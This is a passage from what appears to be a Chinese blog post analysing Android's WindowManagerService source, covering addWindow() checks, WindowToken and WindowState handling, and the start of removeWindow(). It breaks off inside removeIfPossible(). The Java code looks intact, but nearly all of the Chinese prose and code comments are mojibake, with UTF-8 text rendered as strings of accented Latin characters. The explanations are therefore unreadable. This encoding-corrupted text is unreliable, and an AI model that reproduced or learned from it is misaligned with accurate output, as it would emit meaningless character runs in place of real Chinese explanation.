<p>mResizingWindows æ˜¯ç”¨æ¥å­˜å‚¨æ­£åœ¨è°ƒæ•´å¤§å°çš„çª—å£çš„åˆ—è¡¨çš„ã€‚ä¸ mResizingWindows ç±»ä¼¼çš„è¿˜æœ‰ mPendingRemoveã€mDestroySurface å’Œ mDestroyPreservedSurface ç­‰ï¼Œå…¶ä¸­ mPendingRemove æ˜¯åœ¨å†…å­˜è€—å°½æ—¶è®¾ç½®çš„ï¼Œé‡Œé¢å­˜æœ‰éœ€è¦å¼ºåˆ¶åˆ é™¤çš„çª—å£ï¼ŒmDestroySurface é‡Œé¢å­˜æœ‰éœ€è¦è¢«é”€æ¯çš„Surfaceï¼ŒmDestroyPreservedSurface é‡Œé¢å­˜æœ‰çª—å£éœ€è¦ä¿å­˜çš„ç­‰å¾…é”€æ¯çš„ Surfaceï¼Œä¸ºä»€ä¹ˆçª—å£è¦ä¿å­˜è¿™äº› Surface ï¼Ÿè¿™æ˜¯å› ä¸ºå½“çª—å£ç»å† Surface å˜åŒ–æ—¶ï¼Œçª—å£éœ€è¦ä¸€ç›´ä¿æŒæ—§çš„ Surfaceï¼Œç›´åˆ°æ–° Surface çš„ç¬¬ä¸€å¸§ç»˜åˆ¶å®Œæˆã€‚</p>
<h3 data-id="heading-6">5.mAnimatorï¼šWindowAnimator</h3>
<p>mAnimator æ˜¯ WindowAnimator ç±»å‹çš„å˜é‡ï¼Œç”¨äºç®¡ç†çª—å£çš„åŠ¨ç”»ä»¥åŠç‰¹æ•ˆåŠ¨ç”»ã€‚</p>
<h3 data-id="heading-7">6.mHï¼šH</h3>
<p>mH æ˜¯ H ç±»å‹çš„å˜é‡ï¼Œç³»ç»Ÿçš„ Handler ç±»ï¼Œç”¨äºå°†ä»»åŠ¡åŠ å…¥åˆ°ä¸»çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·ä»£ç é€»è¾‘å°±ä¼šåœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œã€‚</p>
<h3 data-id="heading-8">7.mInputManagerï¼šInputManagerService</h3>
<p>InputManagerService ç±»å‹çš„å˜é‡ï¼Œè¾“å…¥ç³»ç»Ÿçš„ç®¡ç†è€…ã€‚InputManagerServiceï¼ˆIMSï¼‰ä¼šå¯¹è§¦æ‘¸äº‹ä»¶è¿›è¡Œå¤„ç†ï¼Œå®ƒä¼šå¯»æ‰¾ä¸€ä¸ªæœ€åˆé€‚çš„çª—å£æ¥å¤„ç†è§¦æ‘¸åé¦ˆä¿¡æ¯ï¼ŒWMS æ˜¯çª—å£çš„ç®¡ç†è€…ï¼Œå› æ­¤ï¼ŒWMS â€œç†æ‰€åº”å½“â€ çš„æˆä¸ºäº†è¾“å…¥ç³»ç»Ÿçš„ä¸­è½¬ç«™ã€‚</p>
<p>è¿˜éœ€è¦ç†è§£çš„å‡ ä¸ªæ¦‚å¿µï¼š</p>
<p><strong>WindowToken</strong>ï¼š</p>
<ul>
<li>å¯ä»¥ç†è§£ä¸ºçª—å£ä»¤ç‰Œï¼Œå½“åº”ç”¨ç¨‹åºæƒ³è¦å‘ WMS ç”³è¯·æ–°åˆ›å»ºä¸€ä¸ªçª—å£ï¼Œåˆ™éœ€è¦å‘ WMS å‡ºç¤ºæœ‰æ•ˆçš„ WindowTokenã€‚WindowToken ä¼šå°†ç›¸åŒç»„ä»¶ï¼ˆæ¯”å¦‚åŒä¸€ä¸ªAcitivityï¼‰çš„çª—å£ï¼ˆWindowStateï¼‰é›†åˆåœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿ç®¡ç†ã€‚</li>
</ul>
<p><strong>WindowState</strong>:</p>
<ul>
<li>WindowState è¡¨ç¤ºä¸€ä¸ªçª—å£çš„æ‰€æœ‰å±æ€§ï¼Œä¸”å­˜åœ¨äº WMS ç«¯ï¼Œæ‰€ä»¥å®ƒæ˜¯ WMS ä¸­äº‹å®ä¸Šçš„çª—å£ã€‚App ç«¯çš„ä¸€ä¸ª Windowï¼Œåœ¨ WMS ç«¯å°±ä¼šæœ‰ä¸€ä¸ª WindowState ã€‚</li>
</ul>
<h2 data-id="heading-9">ä¸‰. Window çš„æ·»åŠ è¿‡ç¨‹ï¼ˆWMS å¤„ç†çš„éƒ¨åˆ†ï¼‰</h2>
<p>å¯¹ Window çš„æ“ä½œåˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯ WindowManger çš„å¤„ç†ï¼Œåœ¨ <a href="https://juejin.cn/post/7602259669706801178" target="_blank" title="https://juejin.cn/post/7602259669706801178">Windowå’ŒWindowManageræºç è§£æ</a> ä¸­å·²ç»åˆ†æè¿‡ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ WMS çš„å¤„ç†ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥åˆ†æ WMS å¤„ç†çš„éƒ¨åˆ†ã€‚Window çš„æ·»åŠ è¿‡ç¨‹éƒ½ä¼šè°ƒç”¨ WMS çš„ addWindow() æ–¹æ³•ï¼Œç”±äºè¿™ä¸ªæ–¹æ³•ä»£ç é€»è¾‘æ¯”è¾ƒå¤šï¼Œè¿™é‡Œåˆ†æˆ3ä¸ªéƒ¨åˆ†æ¥åˆ†æã€‚</p>
<h3 data-id="heading-10">3.1 çª—å£æ£€æŸ¥</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindowManager</span>.Stub
        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watchdog</span>.Monitor, WindowManagerPolicy.WindowManagerFuncs {

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addWindow</span><span class="hljs-params">(Session session, IWindow client, <span class="hljs-type">int</span> seq,
                         LayoutParams attrs, <span class="hljs-type">int</span> viewVisibility, <span class="hljs-type">int</span> displayId, Rect outFrame,
                         Rect outContentInsets, Rect outStableInsets,
                         DisplayCutout.ParcelableWrapper outDisplayCutout, InputChannel outInputChannel,
                         InsetsState outInsetsState, InsetsSourceControl[] outActiveControls,
                         <span class="hljs-type">int</span> requestUserId)</span> {
        Arrays.fill(outActiveControls, <span class="hljs-literal">null</span>);
        <span class="hljs-type">int</span>[] appOp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
        <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isRoundedCornerOverlay</span> <span class="hljs-operator">=</span> (attrs.privateFlags
                &amp; PRIVATE_FLAG_IS_ROUNDED_CORNERS_OVERLAY) != <span class="hljs-number">0</span>;
        <span class="hljs-comment">// è°ƒç”¨ WindowManagerPolicy çš„ checkAddPermission() æ–¹æ³•æ¥æ£€æŸ¥æƒé™ </span>
        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> mPolicy.checkAddPermission(attrs.type, isRoundedCornerOverlay, attrs.packageName,
                appOp);
        <span class="hljs-keyword">if</span> (res != WindowManagerGlobal.ADD_OKAY) {
            <span class="hljs-keyword">return</span> res;
        }
        ...
        <span class="hljs-keyword">synchronized</span> (mGlobalLock) {
            ...
            <span class="hljs-comment">// é€šè¿‡ DisplayId æ¥è·å¾—çª—å£è¦æ·»åŠ åˆ°å“ªä¸ª DisplayContent ä¸Š</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">DisplayContent</span> <span class="hljs-variable">displayContent</span> <span class="hljs-operator">=</span> getDisplayContentOrCreate(displayId, attrs.token);

            <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ° DisplayContentï¼Œè¿”å› WindowManagerGlobal.ADD_INVALID_DISPLAY</span>
            <span class="hljs-keyword">if</span> (displayContent == <span class="hljs-literal">null</span>) {
                ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window to a display that does "</span>
                        + <span class="hljs-string">"not exist: %d. Aborting."</span>, displayId);
                <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_INVALID_DISPLAY;
            }
            <span class="hljs-keyword">if</span> (!displayContent.hasAccess(session.mUid)) {
                ProtoLog.w(WM_ERROR,
                        <span class="hljs-string">"Attempted to add window to a display for which the application "</span>
                                + <span class="hljs-string">"does not have access: %d. Aborting."</span>, displayId);
                <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_INVALID_DISPLAY;
            }

            <span class="hljs-keyword">if</span> (mWindowMap.containsKey(client.asBinder())) {
                ProtoLog.w(WM_ERROR, <span class="hljs-string">"Window %s is already added"</span>, client);
                <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_DUPLICATE_ADD;
            }

            <span class="hljs-comment">// type åœ¨ FIRST_SUB_WINDOW ä¸ LAST_SUB_WINDOW ä¹‹é—´ï¼ˆ1000~1999ï¼‰ï¼Œè¯´æ˜æ˜¯å­çª—å£</span>
            <span class="hljs-keyword">if</span> (type &gt;= FIRST_SUB_WINDOW &amp;&amp; type &lt;= LAST_SUB_WINDOW) {
                <span class="hljs-comment">// attrs.token æ˜¯ IBinder ç±»å‹çš„å¯¹è±¡</span>
                parentWindow = windowForClientLocked(<span class="hljs-literal">null</span>, attrs.token, <span class="hljs-literal">false</span>);
                <span class="hljs-keyword">if</span> (parentWindow == <span class="hljs-literal">null</span>) {
                    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with token that is not a window: "</span>
                            + <span class="hljs-string">"%s. Aborting."</span>, attrs.token);
                    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_BAD_SUBWINDOW_TOKEN;
                }
                <span class="hljs-keyword">if</span> (parentWindow.mAttrs.type &gt;= FIRST_SUB_WINDOW
                        &amp;&amp; parentWindow.mAttrs.type &lt;= LAST_SUB_WINDOW) {
                    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with token that is a sub-window: "</span>
                            + <span class="hljs-string">"%s. Aborting."</span>, attrs.token);
                    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_BAD_SUBWINDOW_TOKEN;
                }
            }
        }
        ...
        <span class="hljs-keyword">return</span> res;
    }
}
</code></pre>
<p>WMS çš„ addWindow() çš„è¿”å›å€¼è¡¨ç¤ºçš„æ˜¯ addWindow() çš„å„ç§çŠ¶æ€ï¼Œæ˜¯ä¸€ä¸ª int å€¼ï¼Œå®šä¹‰åœ¨ WindowManagerGlobal ä¸­ã€‚åœ¨ addWindow() æ–¹æ³•ä¸­å…ˆè°ƒç”¨ WindowManagerPolicy çš„ checkAddPermission() æ–¹æ³•æ¥æ£€æŸ¥æƒé™ï¼Œå…·ä½“åœ¨ PhoneWindowManager çš„ checkAddPermission() æ–¹æ³•ä¸­å®ç°ï¼Œå¦‚æœæ²¡æœ‰æƒé™å°±ä¸ä¼šæ‰§è¡Œåç»­çš„ä»£ç é€»è¾‘ã€‚ç„¶åé€šè¿‡ DisplayId æ¥è·å¾—çª—å£è¦æ·»åŠ åˆ°å“ªä¸ª DisplayContent ä¸Šï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ° DisplayContent ï¼Œè¿”å› ADD_INVALID_DISPLAYï¼Œå…¶ä¸­ DisplayContent æ˜¯ç”¨æ¥æè¿°ä¸€å—å±å¹•çš„ã€‚å…¶ä¸­ type è¡¨ç¤ºçª—å£çš„ç±»å‹ï¼Œå¦‚æœä»‹äº FIRST_SUB_WINDOW å’Œ LAST_SUB_WINDOW ä¹‹é—´ï¼Œè¯´æ˜è¿™ä¸ªçª—å£æ˜¯ä¸€ä¸ªå­çª—å£ï¼Œè¦æ‹¿åˆ°çˆ¶çª—å£çš„ WindowStateï¼Œattrs.token æ˜¯ IBinder ç±»å‹ï¼ŒwindowForClientLocked() æ–¹æ³•ä¼šæ ¹æ® attrs.token ä½œä¸º key å€¼ä» mWindowMap ä¸­å¾—åˆ°è¯¥å­çª—å£çš„çˆ¶çª—å£ã€‚æ¥ç€å¯¹çˆ¶çª—å£è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœçˆ¶çª—å£çš„ WindowState ä¸º null æˆ–è€…çˆ¶çª—å£çš„ type ä¹Ÿæ˜¯å­çª—å£çš„èŒƒå›´ï¼Œä¼šè¿”å›é”™è¯¯çŠ¶æ€ã€‚</p>
<h3 data-id="heading-11">3.2 WindowToken ç›¸å…³å¤„ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€šè¿‡ DisplayContent å°è¯•è·å– WindowToken </span>
<span class="hljs-type">WindowToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> displayContent.getWindowToken(
        hasParent ? parentWindow.mAttrs.token : attrs.token);
<span class="hljs-comment">// If this is a child window, we want to apply the same type checking rules as the</span>
<span class="hljs-comment">// parent window type.</span>
<span class="hljs-comment">// å¦‚æœæœ‰çˆ¶çª—å£ï¼Œå°±å°†çˆ¶çª—å£çš„ type èµ‹å€¼ç»™ rootTypeï¼Œå¦‚æœæ²¡æœ‰å°±å°†å½“å‰çª—å£çš„ type èµ‹å€¼ç»™ rootType</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">rootType</span> <span class="hljs-operator">=</span> hasParent ? parentWindow.mAttrs.type : type;

<span class="hljs-type">boolean</span> <span class="hljs-variable">addToastWindowRequiresToken</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// å¦‚æœ token ä¸º null</span>
<span class="hljs-keyword">if</span> (token == <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// ä½¿ç”¨ unprivilegedAppCanCreateTokenWith() æ–¹æ³•å¯¹ rootType å’Œ type è¿›è¡Œæ£€æŸ¥</span>
    <span class="hljs-keyword">if</span> (!unprivilegedAppCanCreateTokenWith(parentWindow, callingUid, type,
            rootType, attrs.token, attrs.packageName)) {
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_BAD_APP_TOKEN;
    }
    <span class="hljs-keyword">final</span> <span class="hljs-type">IBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> attrs.token != <span class="hljs-literal">null</span> ? attrs.token : client.asBinder();
    <span class="hljs-comment">// åˆ›å»º WindowTokenï¼Œç¬¬ 4 ä¸ªå‚æ•°ä¸º false ï¼Œè¡¨ç¤ºè¿™ä¸ª WindowToken æ˜¯éšå¼åˆ›å»ºçš„</span>
    token = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowToken</span>(<span class="hljs-built_in">this</span>, binder, type, <span class="hljs-literal">false</span>, displayContent,
            session.mCanAddInternalSystemWindow, isRoundedCornerOverlay);
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rootType &gt;= FIRST_APPLICATION_WINDOW
        &amp;&amp; rootType &lt;= LAST_APPLICATION_WINDOW) {
    activity = token.asActivityRecord();
    <span class="hljs-keyword">if</span> (activity == <span class="hljs-literal">null</span>) {
        ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with non-application token "</span>
                + <span class="hljs-string">".%s Aborting."</span>, token);
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_NOT_APP_TOKEN;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (activity.getParent() == <span class="hljs-literal">null</span>) {
        ProtoLog.w(WM_ERROR, <span class="hljs-string">"Attempted to add window with exiting application token "</span>
                + <span class="hljs-string">".%s Aborting."</span>, token);
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_APP_EXITING;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == TYPE_APPLICATION_STARTING &amp;&amp; activity.startingWindow != <span class="hljs-literal">null</span>) {
        ProtoLog.w(WM_ERROR,
                <span class="hljs-string">"Attempted to add starting window to token with already existing"</span>
                        + <span class="hljs-string">" starting window"</span>);
        <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_DUPLICATE_ADD;
    }
} 
...
</code></pre>
<p>è¿™é‡Œå…ˆé€šè¿‡ DisplayContent çš„ getWindowToken() æ–¹æ³•å°è¯•è·å– WindowToken ï¼Œå¦‚æœæœ‰çˆ¶çª—å£ï¼Œå°±å°†çˆ¶çª—å£çš„ type èµ‹å€¼ç»™ rootType ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±å°†å½“å‰çª—å£çš„ type èµ‹å€¼ç»™ rootType ã€‚æ¥ä¸‹æ¥å¦‚æœ token ä¸º null ï¼Œä½¿ç”¨ unprivilegedAppCanCreateTokenWith() æ–¹æ³•å¯¹ rootType å’Œ type è¿›è¡Œæ£€æŸ¥ï¼Œé‡Œé¢æ£€æŸ¥å¦‚æœ rootType å€¼ç­‰äº TYPE_INPUT_METHODã€TYPE_WALLPAPER ç­‰å€¼æ—¶ï¼Œåˆ™è¿”å› ADD_BAD_APP_TOKENï¼Œè¯´æ˜ rootType å€¼ç­‰äº TYPE_INPUT_METHODã€TYPE_WALLPAPER ç­‰å€¼æ—¶æ˜¯ä¸å…è®¸ WindowToken ä¸º null çš„ã€‚å¦‚æœæ£€æŸ¥é€šè¿‡äº†ï¼Œä¼šåˆ›å»º WidowTokenï¼Œè¿™è¯´æ˜å½“æˆ‘ä»¬æ·»åŠ çª—å£æ—¶å¯ä»¥ä¸å‘ WMS æä¾› WindowTokenï¼Œå‰ææ˜¯ rootType å’Œ type çš„å€¼ä¸ä¸ºå‰é¢æ¡ä»¶åˆ¤æ–­ç­›é€‰çš„å€¼ã€‚WindowToken éšå¼å’Œæ˜¾å¼çš„åˆ›å»ºè‚¯å®šæ˜¯è¦åŠ ä»¥åŒºåˆ†çš„ï¼Œåˆ›å»º WidowToken ä¼ å…¥çš„ç¬¬ 4 ä¸ªå‚æ•°ä¸º false å°±è¡¨ç¤ºè¿™ä¸ª WindowToken æ˜¯éšå¼åˆ›å»ºçš„ã€‚</p>
<p>æ¥ä¸‹æ¥çš„ä»£ç é€»è¾‘å°±æ˜¯ WindowToken ä¸ä¸º null çš„æƒ…å†µï¼Œæ ¹æ® rootType å’Œ type çš„å€¼è¿›è¡Œåˆ¤æ–­ã€‚å…ˆåˆ¤æ–­å¦‚æœçª—å£ä¸ºåº”ç”¨ç¨‹åºçª—å£ï¼Œé€šè¿‡ WindowToken çš„ asActivityRecord() æ–¹æ³•æ‹¿åˆ° ActivityRecordï¼Œç„¶åæ ¹æ® ActivityRecord è¿›è¡Œåç»­çš„åˆ¤æ–­ï¼Œè¿”å›ä¸åŒçš„çŠ¶æ€ç ã€‚</p>
<h3 data-id="heading-12">3.3 WindowState çš„åˆ›å»ºå’Œå¤„ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»º WindowStateï¼Œå®ƒå­˜æœ‰çª—å£çš„æ‰€æœ‰çŠ¶æ€ä¿¡æ¯ï¼Œåœ¨ WMS ä¸­å®ƒä»£è¡¨ä¸€ä¸ªçª—å£ï¼Œ</span>
<span class="hljs-comment">// this æŒ‡çš„æ˜¯ WMSï¼Œclient æŒ‡çš„æ˜¯ IWindowï¼Œ token æŒ‡çš„æ˜¯ WindowTokenã€‚</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">WindowState</span> <span class="hljs-variable">win</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowState</span>(<span class="hljs-built_in">this</span>, session, client, token, parentWindow,
        appOp[<span class="hljs-number">0</span>], seq, attrs, viewVisibility, session.mUid, userId,
        session.mCanAddInternalSystemWindow);

<span class="hljs-comment">// åˆ¤æ–­è¯·æ±‚æ·»åŠ çª—å£çš„å®¢æˆ·ç«¯æ˜¯å¦å·²ç»æ­»äº¡ </span>
<span class="hljs-keyword">if</span> (win.mDeathRecipient == <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// Client has apparently died, so there is no reason to</span>
    <span class="hljs-comment">// continue.</span>
    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Adding window client %s"</span>
            + <span class="hljs-string">" that is dead, aborting."</span>, client.asBinder());
    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_APP_EXITING;
}

<span class="hljs-comment">// åˆ¤æ–­çª—å£çš„ DisplayContent æ˜¯å¦ä¸º null</span>
<span class="hljs-keyword">if</span> (win.getDisplayContent() == <span class="hljs-literal">null</span>) {
    ProtoLog.w(WM_ERROR, <span class="hljs-string">"Adding window to Display that has been removed."</span>);
    <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_INVALID_DISPLAY;
}

<span class="hljs-keyword">final</span> <span class="hljs-type">DisplayPolicy</span> <span class="hljs-variable">displayPolicy</span> <span class="hljs-operator">=</span> displayContent.getDisplayPolicy();
<span class="hljs-comment">// æ ¹æ®çª—å£çš„ type å¯¹çª—å£çš„ LayoutParams çš„ä¸€äº›æˆå‘˜å˜é‡è¿›è¡Œä¿®æ”¹</span>
displayPolicy.adjustWindowParamsLw(win, win.mAttrs, callingPid, callingUid);
<span class="hljs-comment">// æ ¹æ®çª—å£çš„ type æ£€æŸ¥æ˜¯å¦å¯ä»¥æŠŠè¿™ä¸ªçª—å£æ·»åŠ åˆ°ç³»ç»Ÿä¸­</span>
res = displayPolicy.validateAddingWindowLw(attrs, callingPid, callingUid);
<span class="hljs-keyword">if</span> (res != WindowManagerGlobal.ADD_OKAY) {
    <span class="hljs-keyword">return</span> res;
}
...
win.attach();
<span class="hljs-comment">//å°† WindowState æ·»åŠ åˆ° mWindowMap ä¸­</span>
mWindowMap.put(client.asBinder(), win);
win.initAppOpsState();

<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">suspended</span> <span class="hljs-operator">=</span> mPmInternal.isPackageSuspended(win.getOwningPackage(),
        UserHandle.getUserId(win.getOwningUid()));
win.setHiddenWhileSuspended(suspended);

<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hideSystemAlertWindows</span> <span class="hljs-operator">=</span> !mHidingNonSystemOverlayWindows.isEmpty();
win.setForceHideNonSystemOverlayWindowIfNeeded(hideSystemAlertWindows);

<span class="hljs-keyword">final</span> <span class="hljs-type">ActivityRecord</span> <span class="hljs-variable">tokenActivity</span> <span class="hljs-operator">=</span> token.asActivityRecord();
<span class="hljs-keyword">if</span> (type == TYPE_APPLICATION_STARTING &amp;&amp; tokenActivity != <span class="hljs-literal">null</span>) {
    tokenActivity.startingWindow = win;
    ProtoLog.v(WM_DEBUG_STARTING_WINDOW, <span class="hljs-string">"addWindow: %s startingWindow=%s"</span>,
            activity, win);
}

<span class="hljs-type">boolean</span> <span class="hljs-variable">imMayMove</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
<span class="hljs-comment">//å°† WindowState æ·»åŠ åˆ°è¯¥ WindowState å¯¹åº”çš„ WindowToken ä¸­</span>
win.mToken.addWindow(win);
displayPolicy.addWindowLw(win, attrs);
<span class="hljs-keyword">if</span> (type == TYPE_INPUT_METHOD) {
    displayContent.setInputMethodWindowLocked(win);
    imMayMove = <span class="hljs-literal">false</span>;
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == TYPE_INPUT_METHOD_DIALOG) {
    displayContent.computeImeTarget(<span class="hljs-literal">true</span> <span class="hljs-comment">/* updateImeTarget */</span>);
    imMayMove = <span class="hljs-literal">false</span>;
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">if</span> (type == TYPE_WALLPAPER) {
        displayContent.mWallpaperController.clearLastWallpaperTimeoutTime();
        displayContent.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((attrs.flags &amp; FLAG_SHOW_WALLPAPER) != <span class="hljs-number">0</span>) {
        displayContent.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (displayContent.mWallpaperController.isBelowWallpaperTarget(win)) {
        <span class="hljs-comment">// If there is currently a wallpaper being shown, and</span>
        <span class="hljs-comment">// the base layer of the new window is below the current</span>
        <span class="hljs-comment">// layer of the target window, then adjust the wallpaper.</span>
        <span class="hljs-comment">// This is to avoid a new window being placed between the</span>
        <span class="hljs-comment">// wallpaper and its target.</span>
        displayContent.pendingLayoutChanges |= FINISH_LAYOUT_REDO_WALLPAPER;
    }
}
...
</code></pre>
<p>å…ˆåˆ›å»ºäº† WindowStateï¼Œå®ƒå­˜æœ‰çª—å£çš„æ‰€æœ‰çš„çŠ¶æ€ä¿¡æ¯ï¼Œåœ¨ WMS ä¸­å®ƒä»£è¡¨ä¸€ä¸ªçª—å£ã€‚åœ¨åˆ›å»º WindowState ä¼ å…¥çš„å‚æ•°ä¸­ï¼Œthis æŒ‡çš„æ˜¯ WMSï¼Œclient æŒ‡çš„æ˜¯ IWindowï¼ŒIWindow ä¼šå°† WMS ä¸­çª—å£ç®¡ç†çš„æ“ä½œå›è°ƒç»™ ViewRootImplï¼Œtoken æŒ‡çš„æ˜¯ WindowToken ï¼Œç´§æ¥ç€åˆ†åˆ«åˆ¤æ–­è¯·æ±‚æ·»åŠ çª—å£çš„å®¢æˆ·ç«¯æ˜¯å¦å·²ç»æ­»äº¡ã€çª—å£çš„
DisplayContent æ˜¯å¦ä¸º nullï¼Œå¦‚æœæ˜¯åˆ™ä¸ä¼šå†æ‰§è¡Œä¸‹é¢çš„ä»£ç é€»è¾‘ã€‚ç„¶åè°ƒç”¨äº† DisplayPolicy çš„ adiustWindowParamsLw() æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¼šæ ¹æ®çª—å£çš„ type å¯¹çª—å£çš„ LayoutParams çš„ä¸€äº›æˆå‘˜å˜é‡è¿›è¡Œä¿®æ”¹ã€‚ç„¶åè°ƒç”¨ DisplayPolicy çš„ validateAddingWindowLw() æ–¹æ³•ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å¯ä»¥æŠŠè¿™ä¸ªçª—å£æ·»åŠ åˆ°ç³»ç»Ÿä¸­ã€‚æ¥ç€å°† WindowState æ·»åŠ åˆ° mWindowMap ä¸­ï¼Œç„¶åå°† WindowState æ·»åŠ åˆ°è¯¥ WindowState å¯¹åº”çš„ WindowToken ä¸­ï¼ˆå®é™…æ˜¯ä¿å­˜åœ¨ WndowToken çš„çˆ¶ç±» WindowContainer ä¸­ï¼‰ï¼Œè¿™æ · WindowToken å°±åŒ…å«äº†åŒä¸€ä¸ªç»„ä»¶çš„ WindowStateã€‚</p>
<h3 data-id="heading-13">3.4 addWindow()æ–¹æ³•æ€»ç»“</h3>
<p>addWindow() æ–¹æ³•åˆ†äº† 3 ä¸ªéƒ¨åˆ†æ¥è¿›è¡Œè®²è§£ï¼Œä¸»è¦å°±æ˜¯åšäº†ä¸‹é¢ 4 ä»¶äº‹:</p>
<ol>
<li>å¯¹æ‰€è¦æ·»åŠ çš„çª—å£è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœçª—å£ä¸æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œå°±ä¸ä¼šå†æ‰§è¡Œä¸‹é¢çš„ä»£ç é€»è¾‘ã€‚</li>
<li>WindowToken ç›¸å…³çš„å¤„ç†ï¼Œæ¯”å¦‚æœ‰çš„çª—å£ç±»å‹éœ€è¦æä¾› WindowToken ï¼Œæ²¡æœ‰æä¾›çš„è¯å°±ä¸ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç é€»è¾‘ï¼Œæœ‰çš„çª—å£ç±»å‹åˆ™å¯ä»¥ç”± WMS éšå¼åˆ›å»º WindowTokenã€‚</li>
<li>WindowStateçš„åˆ›å»ºå’Œç›¸å…³å¤„ç†ï¼Œå°† WindowToken å’Œ WindowState ç›¸å…³è”ã€‚</li>
<li>åˆ›å»ºå’Œé…ç½® DisplayContentï¼Œå®Œæˆçª—å£æ·»åŠ åˆ°ç³»ç»Ÿå‰çš„å‡†å¤‡å·¥ä½œã€‚</li>
</ol>
<h2 data-id="heading-14">å››. Window çš„åˆ é™¤è¿‡ç¨‹</h2>
<p>Window çš„åˆ é™¤è¿‡ç¨‹ä¼šè°ƒç”¨ WMS çš„ removeWindow() æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">removeWindow</span><span class="hljs-params">(Session session, IWindow client)</span> {
    <span class="hljs-keyword">synchronized</span> (mGlobalLock) {
        <span class="hljs-type">WindowState</span> <span class="hljs-variable">win</span> <span class="hljs-operator">=</span> windowForClientLocked(session, client, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 1</span>
        <span class="hljs-keyword">if</span> (win != <span class="hljs-literal">null</span>) {
            win.removeIfPossible(); <span class="hljs-comment">// 2</span>
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// Remove embedded window map if the token belongs to an embedded window</span>
        mEmbeddedWindowController.remove(client);
    }
}
</code></pre>
<p>åœ¨æ³¨é‡Š 1 å¤„è·å– Window å¯¹åº”çš„ WindowStateï¼ŒWindowState ç”¨äºä¿å­˜çª—å£çš„ä¿¡æ¯ï¼Œåœ¨ WMS ä¸­å®ƒç”¨æ¥æè¿°ä¸€ä¸ªçª—å£ã€‚æ¥ç€åœ¨æ³¨é‡Š 2 å¤„è°ƒç”¨ WindowState çš„ removelfPossible() æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">removeIfPossible</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.removeIfPossible();
